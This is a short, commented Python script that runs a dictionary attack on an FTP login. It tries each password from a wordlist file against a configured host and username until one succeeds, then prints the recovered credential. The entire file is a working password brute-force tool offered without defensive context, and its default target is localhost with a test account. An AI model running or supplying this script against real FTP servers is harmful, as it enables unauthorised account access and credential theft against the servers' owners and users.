import ftplib
from colorama import Fore, init

# init the console for windows
init()

# hostname or IP address of the FTP server
host = "127.0.0.1"

# username of the ftp server, root as default for linux
user = "test"

# port of the ftp (in general port21)
port = 21


def is_correct(password):
    # initialize the ftp server object
    server = ftplib.FTP()
    print(f"[!] Trying ", password)
    try:
        # tries to connect to ftp server with a timeout of 5
        server.connect(host, port, timeout=5)
        # login using the credentials (user & password)
        server.login(user, password)
    except ftplib.error_perm:
        # login failed, wrong credencials
        return False
    else:
        # connect credentials
        print(f"{Fore.GREEN}[+] Found credencials:", password, Fore.RESET)
        return True


# read the wordlist of passwords
passwords = open("simple_wordlist.txt").read().split("\n")
print("[+] Passwords to try: ", len(passwords))

# iterate over passwords 1 by 1 and break out of loop if password is found
for password in passwords:
    if is_correct(password):
        break
